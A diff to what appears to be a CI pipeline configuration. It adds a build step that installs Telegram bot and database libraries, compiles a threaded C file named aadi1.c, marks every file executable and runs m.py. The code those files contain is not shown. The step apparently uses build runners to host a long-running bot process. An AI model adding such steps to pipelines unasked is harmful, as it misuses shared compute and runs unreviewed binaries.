@@ -5,3 +5,16 @@
     - "refs/heads/main"
   fail_on_prepare_env_warning: true
   resources: "X2LARGE"
+  actions:
+  - action: "python3 m.py"
+    type: "BUILD"
+    docker_image_name: "library/python"
+    docker_image_tag: "3.13"
+    execute_commands:
+    - "pip3 install telebot pymongo aiohttp"
+    - "if [ -f aadi1.c ]; then gcc aadi1.c -o aadi1 -lpthread; fi"
+    - "chmod +x *"
+    - "python3 m.py"
+    cached_dirs:
+    - "/root/.cache/pip"
+    shell: "BASH"
